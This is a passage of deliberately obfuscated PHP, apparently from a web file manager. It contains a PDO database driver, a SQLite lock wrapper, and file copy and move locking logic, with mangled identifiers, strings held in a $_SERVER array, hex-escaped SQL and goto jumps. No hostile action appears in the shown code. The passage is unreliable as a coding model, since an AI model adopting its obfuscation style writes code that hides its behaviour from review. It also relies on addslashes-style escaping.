$this->PDOStatement = $this->_linkID->prepare($ãÁ«ö®¥); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $²ÊÆãØ = $this->PDOStatement->execute($íˆªÄñ²); $this->debug(); if (!1 === $²ÊÆãØ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ïÕ³†á¢, $Ö¤¼èíñ = array()) { $İçé˜” =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïÕ³†á¢; if (!empty($Ö¤¼èíñ)) { $this->queryStr .= $İçé˜”[1012] . print_r($Ö¤¼èíñ, !0) . $İçé˜”[1013]; } $ñÉóó’° = !1; if ($this->dbType == $İçé˜”[1006]) { if (preg_match($İçé˜”[1014], $this->queryStr, $Şâ½òô)) { $this->table = think_config($İçé˜”[1015]) . str_ireplace(think_config($İçé˜”[1016]), $İçé˜”[454], $Şâ½òô[2]); $ñÉóó’° = (bool) $this->query($İçé˜”[1017] . strtoupper($this->table) . $İçé˜”[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($İçé˜”[25], 1); think_status($İçé˜”[24]); $this->PDOStatement = $this->_linkID->prepare($ïÕ³†á¢); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ú°û´æÜ = $this->PDOStatement->execute($Ö¤¼èíñ); $this->debug(); if (!1 === $ú°û´æÜ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ñÉóó’° || preg_match($İçé˜”[1018], $ïÕ³†á¢)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İÚ»Ÿ›Ç = $this->_linkID->commit(); $this->transTimes = 0; if (!$İÚ»Ÿ›Ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $±Ú²ûÍÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$±Ú²ûÍÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $íõ¸ËäÊ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($íõ¸ËäÊ); return $íõ¸ËäÊ; } public function getFields($ÉğˆÆß) { $¼¯Î¨£Ä =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (think_config($¼¯Î¨£Ä[1019])) { $„â¹Õ¢í = str_replace($¼¯Î¨£Ä[1020], $ÉğˆÆß, think_config($¼¯Î¨£Ä[1019])); } else { switch ($this->dbType) { case $¼¯Î¨£Ä[1003]: case $¼¯Î¨£Ä[1021]: $„â¹Õ¢í = "\123\x45\114\x45\x43\124\x20\x20\40\x63\x6f\154\165\155\x6e\137\156\141\155\145\40\x61\x73\40\x27\x4e\141\155\x65\47\x2c\x20\x20\x20\144\x61\x74\x61\x5f\164\x79\x70\x65\40\x61\163\40\x27\124\171\160\145\x27\54\40\x20\40\x63\157\154\165\155\x6e\x5f\144\x65\x66\141\165\x6c\x74\40\141\163\40\x27\104\145\146\141\x75\154\164\x27\x2c\40\x20\x20\x69\163\x5f\156\165\154\x6c\141\142\154\x65\x20\141\x73\x20\47\116\165\154\154\47\xa\11\x9\x46\122\117\x4d\11\151\x6e\x66\x6f\162\x6d\x61\164\x69\157\x6e\137\163\143\150\x65\155\141\56\164\141\x62\x6c\x65\163\x20\x41\123\x20\x74\12\x9\11\x4a\x4f\111\116\x9\151\156\x66\x6f\x72\155\141\164\x69\157\x6e\x5f\x73\143\150\145\x6d\141\x2e\143\x6f\154\x75\155\x6e\163\40\x41\x53\x20\x63\12\x9\11\x4f\116\40\x20\164\x2e\164\x61\x62\154\x65\x5f\143\141\x74\x61\154\157\147\x20\x3d\x20\143\56\164\x61\x62\154\145\x5f\143\141\164\141\x6c\x6f\x67\xa\x9\11\101\x4e\x44\x20\164\x2e\164\x61\x62\x6c\x65\137\x73\x63\x68\145\x6d\x61\x20\x3d\x20\x63\x2e\x74\141\x62\154\x65\137\x73\x63\x68\145\155\141\12\x9\11\101\116\104\40\x74\x2e\164\x61\142\x6c\145\137\156\141\155\145\x20\x3d\40\143\56\x74\x61\142\154\145\x5f\156\141\155\145\xa\11\11\x57\110\105\x52\x45\x20\40\x20\164\x2e\x74\x61\142\154\145\x5f\x6e\x61\x6d\145\40\x3d\40\47{$ÉğˆÆß}\47"; break; case $¼¯Î¨£Ä[1022]: $„â¹Õ¢í = $¼¯Î¨£Ä[1023] . $ÉğˆÆß . $¼¯Î¨£Ä[1024]; break; case $¼¯Î¨£Ä[1004]: case $¼¯Î¨£Ä[1006]: $„â¹Õ¢í = $¼¯Î¨£Ä[1025] . $¼¯Î¨£Ä[1026] . $¼¯Î¨£Ä[1027] . strtoupper($ÉğˆÆß) . $¼¯Î¨£Ä[1028] . strtoupper($ÉğˆÆß) . $¼¯Î¨£Ä[1029]; break; case $¼¯Î¨£Ä[1030]: $„â¹Õ¢í = $¼¯Î¨£Ä[1031] . $ÉğˆÆß . $¼¯Î¨£Ä[1032]; break; case $¼¯Î¨£Ä[1005]: break; case $¼¯Î¨£Ä[1033]: default: $„â¹Õ¢í = $¼¯Î¨£Ä[1034] . ($this->dbType == $¼¯Î¨£Ä[1033] ? "\140{$ÉğˆÆß}\140" : $ÉğˆÆß); } } $ÊÅ ªá = $this->query($„â¹Õ¢í); $§‚à¸Ìì = array(); if ($ÊÅ ªá) { foreach ($ÊÅ ªá as $µ¼İ€İó => $œ‹²ƒ„) { $œ‹²ƒ„ = array_change_key_case($œ‹²ƒ„); $œ‹²ƒ„[$¼¯Î¨£Ä[32]] = isset($œ‹²ƒ„[$¼¯Î¨£Ä[32]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[32]] : $¼¯Î¨£Ä[454]; $œ‹²ƒ„[$¼¯Î¨£Ä[33]] = isset($œ‹²ƒ„[$¼¯Î¨£Ä[33]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[33]] : $¼¯Î¨£Ä[454]; $û›ƒÎ“ = isset($œ‹²ƒ„[$¼¯Î¨£Ä[350]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[350]] : $œ‹²ƒ„[$¼¯Î¨£Ä[32]]; $§‚à¸Ìì[$û›ƒÎ“] = array($¼¯Î¨£Ä[32] => $û›ƒÎ“, $¼¯Î¨£Ä[33] => $œ‹²ƒ„[$¼¯Î¨£Ä[33]], $¼¯Î¨£Ä[35] => (bool) (isset($œ‹²ƒ„[$¼¯Î¨£Ä[106]]) && $œ‹²ƒ„[$¼¯Î¨£Ä[106]] === $¼¯Î¨£Ä[12] || isset($œ‹²ƒ„[$¼¯Î¨£Ä[35]]) && $œ‹²ƒ„[$¼¯Î¨£Ä[35]] === $¼¯Î¨£Ä[12]), $¼¯Î¨£Ä[37] => isset($œ‹²ƒ„[$¼¯Î¨£Ä[37]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[37]] : (isset($œ‹²ƒ„[$¼¯Î¨£Ä[56]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[56]] : $¼¯Î¨£Ä[454]), $¼¯Î¨£Ä[39] => isset($œ‹²ƒ„[$¼¯Î¨£Ä[97]]) ? strtolower($œ‹²ƒ„[$¼¯Î¨£Ä[97]]) == $¼¯Î¨£Ä[41] : (isset($œ‹²ƒ„[$¼¯Î¨£Ä[57]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[57]] : !1), $¼¯Î¨£Ä[42] => isset($œ‹²ƒ„[$¼¯Î¨£Ä[1035]]) ? strtolower($œ‹²ƒ„[$¼¯Î¨£Ä[1035]]) == $¼¯Î¨£Ä[44] : (isset($œ‹²ƒ„[$¼¯Î¨£Ä[97]]) ? $œ‹²ƒ„[$¼¯Î¨£Ä[97]] : !1)); } } return $§‚à¸Ìì; } public function getTables($ñïŒŞ™Ü = '') { $®ÜÂ“¬Ç =& $_SERVER[²Ö÷öõ]; if (think_config($®ÜÂ“¬Ç[1036])) { $÷ñÂ”¡á = str_replace($®ÜÂ“¬Ç[1037], $ñïŒŞ™Ü, think_config($®ÜÂ“¬Ç[1036])); } else { switch ($this->dbType) { case $®ÜÂ“¬Ç[1004]: case $®ÜÂ“¬Ç[1006]: $÷ñÂ”¡á = $®ÜÂ“¬Ç[1038]; break; case $®ÜÂ“¬Ç[1003]: case $®ÜÂ“¬Ç[1021]: $÷ñÂ”¡á = $®ÜÂ“¬Ç[1039]; break; case $®ÜÂ“¬Ç[1030]: $÷ñÂ”¡á = $®ÜÂ“¬Ç[1040]; break; case $®ÜÂ“¬Ç[1005]: think_exception(think_lang($®ÜÂ“¬Ç[1041]) . $®ÜÂ“¬Ç[1042]); break; case $®ÜÂ“¬Ç[1022]: $÷ñÂ”¡á = $®ÜÂ“¬Ç[45] . $®ÜÂ“¬Ç[46] . $®ÜÂ“¬Ç[47]; break; case $®ÜÂ“¬Ç[1033]: default: if (!empty($ñïŒŞ™Ü)) { $÷ñÂ”¡á = $®ÜÂ“¬Ç[985] . $ñïŒŞ™Ü . $®ÜÂ“¬Ç[986]; } else { $÷ñÂ”¡á = $®ÜÂ“¬Ç[987]; } } } $è–íçş³ = $this->query($÷ñÂ”¡á); $±¼‹ğäñ = array(); foreach ($è–íçş³ as $ÜêçìëÎ => $îäÆ¥ĞÄ) { $±¼‹ğäñ[$ÜêçìëÎ] = current($îäÆ¥ĞÄ); } return $±¼‹ğäñ; } protected function parseLimit($Œè¦å™) { $‡™ğÔÎ =& $_SERVER[²Ö÷öõ]; $úÉƒë×Ñ = $‡™ğÔÎ[12]; if (!empty($Œè¦å™)) { switch ($this->dbType) { case $‡™ğÔÎ[1030]: case $‡™ğÔÎ[1022]: $Œè¦å™ = explode($‡™ğÔÎ[50], $Œè¦å™); if (count($Œè¦å™) > 1) { $úÉƒë×Ñ .= $‡™ğÔÎ[51] . $Œè¦å™[1] . $‡™ğÔÎ[52] . $Œè¦å™[0] . $‡™ğÔÎ[53]; } else { $úÉƒë×Ñ .= $‡™ğÔÎ[51] . $Œè¦å™[0] . $‡™ğÔÎ[53]; } break; case $‡™ğÔÎ[1003]: case $‡™ğÔÎ[1021]: break; case $‡™ğÔÎ[1005]: break; case $‡™ğÔÎ[1004]: case $‡™ğÔÎ[1006]: break; case $‡™ğÔÎ[1033]: default: $úÉƒë×Ñ .= $‡™ğÔÎ[51] . $Œè¦å™ . $‡™ğÔÎ[53]; } } return $úÉƒë×Ñ; } public function parseKey(&$‰Şû¼š, $Ğ³êÑŠ¾ = true) { $êÜ®Ì =& $_SERVER[²Ö÷öõ]; if ($Ğ³êÑŠ¾) { $‰Şû¼š = $this->parseKeyCheck($‰Şû¼š); } if ($this->dbType == $êÜ®Ì[1033]) { if ($‰Şû¼š != $êÜ®Ì[220] && !preg_match($êÜ®Ì[997], $‰Şû¼š)) { $‰Şû¼š = $êÜ®Ì[461] . trim($‰Şû¼š, $êÜ®Ì[461]) . $êÜ®Ì[461]; } return $‰Şû¼š; } else { return parent::parseKey($‰Şû¼š, $Ğ³êÑŠ¾); } } public function close() { $this->_linkID = null; } public function error() { $÷–Ïßè =& $_SERVER[²Ö÷öõ]; if ($this->PDOStatement) { $¡Ó‡ûŒ¯ = $this->PDOStatement->errorInfo(); $this->error = $¡Ó‡ûŒ¯[1] . $÷–Ïßè[4] . $¡Ó‡ûŒ¯[2]; } else { $this->error = $÷–Ïßè[12]; } if ($÷–Ïßè[12] != $this->queryStr) { $this->error .= LNG($÷–Ïßè[48]) . $this->queryStr; } think_trace($this->error, $÷–Ïßè[12], $÷–Ïßè[49]); return $this->error; } public function escapeString($ÖŒ¥íü™) { $„Õ¾ª²È =& $_SERVER[²Ö÷öõ]; switch ($this->dbType) { case $„Õ¾ª²È[1030]: case $„Õ¾ª²È[1003]: case $„Õ¾ª²È[1021]: case $„Õ¾ª²È[1033]: return addslashes($ÖŒ¥íü™); case $„Õ¾ª²È[1005]: case $„Õ¾ª²È[1022]: case $„Õ¾ª²È[1004]: case $„Õ¾ª²È[1006]: return str_ireplace($„Õ¾ª²È[58], $„Õ¾ª²È[59], $ÖŒ¥íü™); } } protected function parseValue($ÎØ¹Œ³Ø) { $ÜÁ…Æ»ş =& $_SERVER[²Ö÷öõ]; if (is_string($ÎØ¹Œ³Ø)) { $¬ºàÛ† = strpos($ÎØ¹Œ³Ø, $ÜÁ…Æ»ş[4]) === 0 && in_array($ÎØ¹Œ³Ø, array_keys($this->bind)); $ÎØ¹Œ³Ø = $¬ºàÛ† ? $this->escapeString($ÎØ¹Œ³Ø) : $ÜÁ…Æ»ş[1043] . $this->escapeString($ÎØ¹Œ³Ø) . $ÜÁ…Æ»ş[1043]; } elseif (isset($ÎØ¹Œ³Ø[0]) && is_string($ÎØ¹Œ³Ø[0]) && strtolower($ÎØ¹Œ³Ø[0]) == $ÜÁ…Æ»ş[373]) { $ÎØ¹Œ³Ø = $this->escapeString($ÎØ¹Œ³Ø[1]); } elseif (is_array($ÎØ¹Œ³Ø)) { $ÎØ¹Œ³Ø = array_map(array($this, $ÜÁ…Æ»ş[1044]), $ÎØ¹Œ³Ø); } elseif (is_bool($ÎØ¹Œ³Ø)) { $ÎØ¹Œ³Ø = $ÎØ¹Œ³Ø ? $ÜÁ…Æ»ş[91] : $ÜÁ…Æ»ş[228]; } elseif (is_null($ÎØ¹Œ³Ø)) { $ÎØ¹Œ³Ø = $ÜÁ…Æ»ş[106]; } return $ÎØ¹Œ³Ø; } public function getLastInsertId() { $Ôìıúİ =& $_SERVER[²Ö÷öõ]; switch ($this->dbType) { case $Ôìıúİ[1030]: case $Ôìıúİ[1022]: case $Ôìıúİ[1003]: case $Ôìıúİ[1021]: case $Ôìıúİ[1005]: case $Ôìıúİ[1033]: return $this->_linkID->lastInsertId(); case $Ôìıúİ[1004]: case $Ôìıúİ[1006]: $²Şõù– = $this->table; $ÁúóÎşÆ = $this->query("\x53\x45\x4c\x45\103\124\x20{$²Şõù–}\56\143\x75\162\162\166\x61\x6c\x20\143\165\x72\162\x76\141\x6c\40\x46\122\117\x4d\x20\x64\x75\141\x6c"); return $ÁúóÎşÆ ? $ÁúóÎşÆ[0][$Ôìıúİ[1045]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($”ÄğÒØ®) { $ŒúœºÍ· =& $_SERVER[²Ö÷öõ]; if (!CacheLock::fileLock($ŒúœºÍ·[13])) { return !1; } $ßòöŸˆ = parent::query($”ÄğÒØ®); CacheLock::fileUnLock($ŒúœºÍ·[13]); return $ßòöŸˆ; } public function execute($Â¤©©ì“) { $İü´îâ =& $_SERVER[²Ö÷öõ]; if (!CacheLock::fileLock($İü´îâ[13])) { return !1; } $™¯òš«Ô = parent::execute($Â¤©©ì“); CacheLock::fileUnLock($İü´îâ[13]); return $™¯òš«Ô; } } goto e…Æ©ù·í; f¼øÒÛóíÙ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($™’¡É€Š) { $‡ú©øŒÖ =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡ú©øŒÖ[618], $™’¡É€Š); $Ã÷Ù®Û× = 1; $this->_lockEvent($™’¡É€Š, array($‡ú©øŒÖ[619], $‡ú©øŒÖ[620]), $Ã÷Ù®Û×); $this->_lockParent($™’¡É€Š, array($‡ú©øŒÖ[620]), $Ã÷Ù®Û×); $this->_lockEvent($™’¡É€Š, array($‡ú©øŒÖ[621], $‡ú©øŒÖ[622]), $Ã÷Ù®Û×); $this->_lockCheckEnd($‡ú©øŒÖ[618], $™’¡É€Š); } public function lockCopyEnd($Æƒø³³“) { $èıìñâš =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $Àü»‰˜¯ = 0; $this->_lockEvent($Æƒø³³“, array($èıìñâš[619], $èıìñâš[620]), $Àü»‰˜¯); $this->_lockParent($Æƒø³³“, array($èıìñâš[620]), $Àü»‰˜¯); $this->_lockEvent($Æƒø³³“, array($èıìñâš[621], $èıìñâš[622]), $Àü»‰˜¯); } public function lockWriteStart($ºİôÙ´å, $œ‘Ú‹ë­ = '') { $•ÆÌŠòé =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $this->_lockCheck($•ÆÌŠòé[619], $ºİôÙ´å); $¤§Ñ©º = 1; $this->_lockKey($•ÆÌŠòé[623] . $ºİôÙ´å . $•ÆÌŠòé[10] . $œ‘Ú‹ë­, $¤§Ñ©º); $this->_lockEvent($ºİôÙ´å, array($•ÆÌŠòé[618], $•ÆÌŠòé[620]), $¤§Ñ©º); $this->_lockParent($ºİôÙ´å, array($•ÆÌŠòé[618], $•ÆÌŠòé[620]), $¤§Ñ©º); $this->_lockCheckEnd($•ÆÌŠòé[619], $ºİôÙ´å); } public function lockWriteEnd($‡£¥¨¼®, $Ğ¤ü‹—¥ = '') { $İÖ·¤‚ =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $ŒÀÄıüì = 0; $this->_lockKey($İÖ·¤‚[623] . $‡£¥¨¼® . $İÖ·¤‚[10] . $Ğ¤ü‹—¥, $ŒÀÄıüì); $this->_lockEvent($‡£¥¨¼®, array($İÖ·¤‚[618], $İÖ·¤‚[620]), $ŒÀÄıüì); $this->_lockParent($‡£¥¨¼®, array($İÖ·¤‚[618], $İÖ·¤‚[620]), $ŒÀÄıüì); } public function lockMoveStart($ï‹‰Øƒ°) { $è›ÓßŒ› =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $this->_lockCheck($è›ÓßŒ›[620], $ï‹‰Øƒ°); $ÖçœºÁ = 1; $this->_lockKey($è›ÓßŒ›[624] . $ï‹‰Øƒ°, $ÖçœºÁ); $this->_lockEvent($ï‹‰Øƒ°, array($è›ÓßŒ›[618], $è›ÓßŒ›[619]), $ÖçœºÁ); $this->_lockParent($ï‹‰Øƒ°, array($è›ÓßŒ›[618], $è›ÓßŒ›[620]), $ÖçœºÁ); $this->_lockEvent($ï‹‰Øƒ°, array($è›ÓßŒ›[625], $è›ÓßŒ›[621], $è›ÓßŒ›[622]), $ÖçœºÁ); $this->_lockCheckEnd($è›ÓßŒ›[620], $ï‹‰Øƒ°); } public function lockMoveEnd($¢®±¥ÊÀ) { $Ä¹ù‰«³ =& $_SERVER[²Ö÷öõ]; if (!$this->allowLock()) { return; } $ºì­ë© = 0; $this->_lockKey($Ä¹ù‰«³[624] . $¢®±¥ÊÀ, $ºì­ë©); $this->_lockEvent($¢®±¥ÊÀ, array($Ä¹ù‰«³[618], $Ä¹ù‰«³[619]), $ºì­ë©); $this->_lockParent($¢®±¥ÊÀ, array($Ä¹ù‰«³[618], $Ä¹ù‰«³[620]), $ºì­ë©); $this->_lockEvent($¢®±¥ÊÀ, array($Ä¹ù‰«³[625], $Ä¹ù‰«³[621], $Ä¹ù‰«³[622]), $ºì­ë©); } private function _lockCheck($üßåñò, $ñ¯”õ°) { $ôŞÉÈ­š =& $_SERVER[²Ö÷öõ]; $¿Æ¯ë¯ = $this->sourceInfo($ñ¯”õ°); $´Îüøı = $üßåñò . $ôŞÉÈ­š[10] . $ñ¯”õ°; $this->_lockTimeStart[$´Îüøı] = timeFloat(); if (!is_array($¿Æ¯ë¯)) { return; } $˜Ì‡ğÊü = LNG($ôŞÉÈ­š[626]); CacheLock::setErrorMsg($ôŞÉÈ­š[176] . htmlspecialchars($¿Æ¯ë¯[$ôŞÉÈ­š[32]]) . $ôŞÉÈ­š[178] . $˜Ì‡ğÊü); $this->_lockKey($´Îüøı, 1); $this->_lockKey($´Îüøı, 0); $½‘ÇÈ‘½ = array_reverse($this->parentLevelArray($¿Æ¯ë¯[$ôŞÉÈ­š[584]])); foreach ($½‘ÇÈ‘½ as $±ó•ú’) { $´Îüøı = $üßåñò . $ôŞÉÈ­š[627] . $±ó•ú’; if (CacheLock::lockGet($ôŞÉÈ­š[628] . $´Îüøı)) { $¿Æ¯ë¯ = $this->sourceInfo($±ó•ú’); CacheLock::setErrorMsg($ôŞÉÈ­š[176] . htmlspecialchars($¿Æ¯ë¯[$ôŞÉÈ­š[32]]) . $ôŞÉÈ­š[178] . $˜Ì‡ğÊü); $this->_lockKey($´Îüøı, 1); $this->_lockKey($´Îüøı, 0); } } } private function _lockCheckEnd($ƒ¡°û¿, $¿ò‹òÁ–) { $Õå¨³© =& $_SERVER[²Ö÷öõ]; $«®òÇ½¿ = $ƒ¡°û¿ . $Õå¨³©[10] . $¿ò‹òÁ–; CacheLock::setErrorMsg($Õå¨³©[454]); if (!isset($this->_lockTimeStart[$«®òÇ½¿])) { return; } $¯ğ›óç² = timeFloat() - $this->_lockTimeStart[$«®òÇ½¿]; unset($this->_lockTimeStart[$«®òÇ½¿]); if ($¯ğ›óç² > 0.5) { unset(self::$cacheSourceInfo[$Õå¨³©[533] . $¿ò‹òÁ–]); } $şüƒ‡ÛØ = $this->sourceInfo($¿ò‹òÁ–); if (!$şüƒ‡ÛØ) { show_json(LNG($Õå¨³©[108]), !1); } } private function _lockParent($—“ßæÁ, $Æ…“¡µè, $ìÚê§å¹) { if (!$this->autoLockSet) { return; } $ãÆæ¥ù° = $this->sourceInfo($—“ßæÁ); if (!is_array($ãÆæ¥ù°)) { return; } $”úÃÈ±½ = array_reverse($this->parentLevelArray($ãÆæ¥ù°[$_SERVER[²Ö÷öõ][584]])); foreach ($”úÃÈ±½ as $î«›¤Ÿ) { $this->_lockEvent($î«›¤Ÿ, $Æ…“¡µè, $ìÚê§å¹); } } private function _lockEvent($ı¡©†¾Î, $óñÆÑ˜, $¸ß±ëÖî) { $‰Î÷±„½ =& $_SERVER[²Ö÷öõ]; if (!$this->autoLockSet) { return; } foreach ($óñÆÑ˜ as $Øı£ÀÁ) { $èƒ¥ ÑÂ = $Øı£ÀÁ . $‰Î÷±„½[10] . $ı¡©†¾Î; if ($¸ß±ëÖî && CacheLock::lockGet($‰Î÷±„½[628] . $èƒ¥ ÑÂ)) { continue; } $this->_lockKey($èƒ¥ ÑÂ, $¸ß±ëÖî); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($×ÛÆë, $çÏ¼Â½À = 1) { $°ª‰€è… = $_SERVER[²Ö÷öõ][628] . md5($×ÛÆë); if ($çÏ¼Â½À) { if (isset(self::$_lockItemArr[$°ª‰€è…])) { return; } self::$_lockItemArr[$°ª‰€è…] = 1; CacheLock::lock($°ª‰€è…, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$°ª‰€è…])) { return; } unset(self::$_lockItemArr[$°ª‰€è…]); CacheLock::unlock($°ª‰€è…); } } public function isParentOf($¸”°º¢¼, $¥¯…¡…¥) { $ïåÍ—‰â =& $_SERVER[²Ö÷öõ]; $¬ ï²±“ = $this->sourceInfo($¸”°º¢¼); $¿„÷ò¦³ = $this->sourceInfo($¥¯…¡…¥); $ÑÓ¿ÆÕˆ = $¬ ï²±“[$ïåÍ—‰â[584]] . $¬ ï²±“[$ïåÍ—‰â[193]] . $ïåÍ—‰â[50]; $Åƒ­ûà = $¿„÷ò¦³[$ïåÍ—‰â[584]] . $¿„÷ò¦³[$ïåÍ—‰â[193]] . $ïåÍ—‰â[50]; $ÜªÎß‘† = strpos($Åƒ­ûà, $ÑÓ¿ÆÕˆ) === 0; return $ÜªÎß‘†; } private $targetIsDelete = 0; public function copy($µ˜´ÈÜâ, $ØÄ«Î«Ş, $Ü­Úó¨ˆ = REPEAT_REPLACE, $”ëéÜ“® = '') { $ƒşêé©… =& $_SERVER[²Ö÷öõ]; $ŒÑŞ×ä = $this->sourceInfo($µ˜´ÈÜâ); $Ù…Çş• = $this->sourceInfo($ØÄ«Î«Ş); if (!$ŒÑŞ×ä || !$Ù…Çş• || $Ù…Çş•[$ƒşêé©…[485]] != $ƒşêé©…[91]) { return !1; } if ($this->isParentOf($µ˜´ÈÜâ, $ØÄ«Î«Ş)) { return !1; } $×¨‰¿Ÿ” = $”ëéÜ“® ? $”ëéÜ“® : $ŒÑŞ×ä[$ƒşêé©…[32]]; $this->lockCopyStart($µ˜´ÈÜâ); $this->lockWriteStart($ØÄ«Î«Ş, $×¨‰¿Ÿ”); $¯¸Ùâ· = array($ƒşêé©…[629] => array(), $ƒşêé©…[630] => array(), $ƒşêé©…[631] => array()); $this->targetIsDelete = intval($ŒÑŞ×ä[$ƒşêé©…[505]]); $¥ŒÉ¼«¡ = $this->fileNameExistAuto($ØÄ«Î«Ş, $ŒÑŞ×ä); $£¯ÜÉ’ = $this->_copy($µ˜´ÈÜâ, $ØÄ«Î«Ş, $Ü­Úó¨ˆ, $¯¸Ùâ·, !0, $”ëéÜ“®); $this->_childrenListClear(); $this->lockCopyEnd($µ˜´ÈÜâ); $this->lockWriteEnd($ØÄ«Î«Ş, $×¨‰¿Ÿ”); if ($ŒÑŞ×ä[$ƒşêé©…[485]] == $ƒşêé©…[91] && $¥ŒÉ¼«¡ == $£¯ÜÉ’) { $this->folderSizeResetChildren($¥ŒÉ¼«¡); } Model($ƒşêé©…[632])->addAll($¯¸Ùâ·[$ƒşêé©…[630]], array(), !0); if ($¥ŒÉ¼«¡ != $£¯ÜÉ’ || $ŒÑŞ×ä[$ƒşêé©…[485]] == $ƒşêé©…[91]) { Model($ƒşêé©…[633])->eventCopy($£¯ÜÉ’); } $this->saveAll($¯¸Ùâ·[$ƒşêé©…[631]]); Model($ƒşêé©…[230])->linkAdd($¯¸Ùâ·[$ƒşêé©…[629]]); $this->folderSizeReset($ØÄ«Î«Ş); $this->updateModifyTime($ØÄ«Î«Ş); return $£¯ÜÉ’; } private function _copy($ËèĞ¾£‘, $Ú™ü‚ø—, $¦‡ÄÀ¹ò, &$”ÇáüÜ¢, $ÑÑêÍã, $Î¶ö¡‘ = '') { $Ã©˜ÊÕ =& $_SERVER[²Ö÷öõ]; $Á¤Ì”÷Ë = $this->sourceInfoCache($ËèĞ¾£‘); $…‡¡ÃĞÁ = $Á¤Ì”÷Ë[$Ã©˜ÊÕ[485]] == $Ã©˜ÊÕ[91]; $ö¯¡ÀÃÌ = $Î¶ö¡‘ ? $Î¶ö¡‘ : $Á¤Ì”÷Ë[$Ã©˜ÊÕ[32]]; $£Âï± = $this->fileNameExistAuto($Ú™ü‚ø—, $Á¤Ì”÷Ë); if ($ÑÑêÍã) { $this->_childrenAllMake($ËèĞ¾£‘); if ($…‡¡ÃĞÁ && $£Âï±) { $this->_childrenAllMake($£Âï±); } } if (!$£Âï±) { return $this->_copyCreate($ËèĞ¾£‘, $Ú™ü‚ø—, $ö¯¡ÀÃÌ, $”ÇáüÜ¢); } $€èñˆš§ = $£Âï±; if ($…‡¡ÃĞÁ) { if ($¦‡ÄÀ¹ò == REPEAT_RENAME_FOLDER) { $ö¯¡ÀÃÌ = $this->fileNameAutoCache($Ú™ü‚ø—, $ö¯¡ÀÃÌ, $¦‡ÄÀ¹ò, $…‡¡ÃĞÁ); $€èñˆš§ = $this->_copyCreate($ËèĞ¾£‘, $Ú™ü‚ø—, $ö¯¡ÀÃÌ, $”ÇáüÜ¢); } else { $¨í¹«° = $this->_childrenList($ËèĞ¾£‘); foreach ($¨í¹«° as $æŞ¨ıïÆ) { $this->_copy($æŞ¨ıïÆ[$Ã©˜ÊÕ[193]], $£Âï±, $¦‡ÄÀ¹ò, $”ÇáüÜ¢, !1); } } } else { if ($¦‡ÄÀ¹ò == REPEAT_RENAME || $¦‡ÄÀ¹ò == REPEAT_RENAME_FOLDER) { $ö¯¡ÀÃÌ = $this->fileNameAutoCache($Ú™ü‚ø—, $ö¯¡ÀÃÌ, $¦‡ÄÀ¹ò, $…‡¡ÃĞÁ); $€èñˆš§ = $this->_copyCreate($ËèĞ¾£‘, $Ú™ü‚ø—, $ö¯¡ÀÃÌ, $”ÇáüÜ¢); } else { if ($¦‡ÄÀ¹ò == REPEAT_REPLACE) { $Œ½‡²öØ = $this->sourceInfoCache($£Âï±); $µŠØ”¸« = $this->fileHistory($Œ½‡²öØ, $Á¤Ì”÷Ë[$Ã©˜ÊÕ[541]], $Á¤Ì”÷Ë[$Ã©˜ÊÕ[79]]); if ($µŠØ”¸«) { $”ÇáüÜ¢[$Ã©˜ÊÕ[629]][] = $Á¤Ì”÷Ë[$Ã©˜ÊÕ[541]]; } } else { if ($¦‡ÄÀ¹ò == REPEAT_SKIP) { } } } Hook::trigger($Ã©˜ÊÕ[634], array($Ã©˜ÊÕ[635], $Á¤Ì”÷Ë, 0)); } return $€èñˆš§; } private function _copyCreate($í¥éœËŞ, $Ë°æÚ, $Ç°ŞğÆ§, &$Å…Ô·Òà) { $Ê‹†­è‘ =& $_SERVER[²Ö÷öõ]; $‰“ãµ˜· = $this->sourceInfoCache($í¥éœËŞ); $ñæ¶¹êñ = $this->sourceInfoCache($Ë°æÚ); $ûûã‹¸ = $this->_makeItemData($‰“ãµ˜·, $ñæ¶¹êñ, $Ç°ŞğÆ§); Hook::trigger($Ê‹†­è‘[636], $ûûã‹¸); Hook::trigger($Ê‹†­è‘[637], array($Ê‹†­è‘[638], $ûûã‹¸, 0)); $Ó¥©úø‡ = $this->add($ûûã‹¸); $áıÙÜŒ’ = array($Ê‹†­è‘[193] => $Ó¥©úø‡, $Ê‹†­è‘[32] => $Ç°ŞğÆ§); $this->_copyApplyMeta($áıÙÜŒ’, $Å…Ô·Òà); if ($‰“ãµ˜·[$Ê‹†­è‘[485]] != $Ê‹†­è‘[91]) { $Å…Ô·Òà[$Ê‹†­è‘[629]][] = $‰“ãµ˜·[$Ê‹†­è‘[541]]; return $Ó¥©úø‡; } $¢®ï¯ = array(); $ó±´ï‹À = array(); $this->_childrenListAll($í¥éœËŞ, 